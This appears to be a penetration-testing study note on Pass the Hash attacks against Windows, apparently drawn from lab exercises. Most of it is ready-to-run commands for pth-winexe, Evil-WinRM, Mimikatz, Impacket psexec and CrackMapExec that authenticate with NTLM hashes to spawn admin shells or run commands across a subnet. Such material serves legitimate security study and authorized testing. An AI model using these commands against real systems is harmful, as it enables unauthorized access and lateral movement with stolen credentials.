---
tags:
  - Post-Exploitation
  - OperatingSystems
  - Windows
  - Concepts
  - Vulnerabilities
aliases:
  - PtH
  - Pass the Hash
---
A [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.
## Guides

1. [Practical Usage of NTLM Hashes - ropnop blog](https://blog.ropnop.com/practical-usage-of-ntlm-hashes/#long-live-pth)


## Methods

#### Pass the Hash Toolkit

See [[pth-toolkit]]

Use the full admin hash with `pth-winexe` to spawn a shell running as admin without needing to crack their password. 
Remember the full hash includes **both the LM and NTLM hash**, separated by a colon:

```
pth-winexe -U 'admin%hash' //10.10.181.132 cmd.exe
```

#### Evil-WinRM

See [[Evil-WinRM]]

```shell-session
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```


## Mimikatz

See [[Mimikatz]]

Mimikatz has a module named `sekurlsa::pth` that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password. To use this module, we will need the following:

- `/user` - The user name we want to impersonate.
- `/rc4` or `/NTLM` - NTLM hash of the user's password.
- `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
- `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

```cmd-session
 mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

## Invoke-TheHash

See [[Invoke-TheHash]]
## Impacket

See [[Impacket]]

```shell-session
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:

- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

## CrackMapExec

See [[CrackMapExec]]

```shell-session
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add `--local-auth` to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. We can use the option `-x` to execute commands.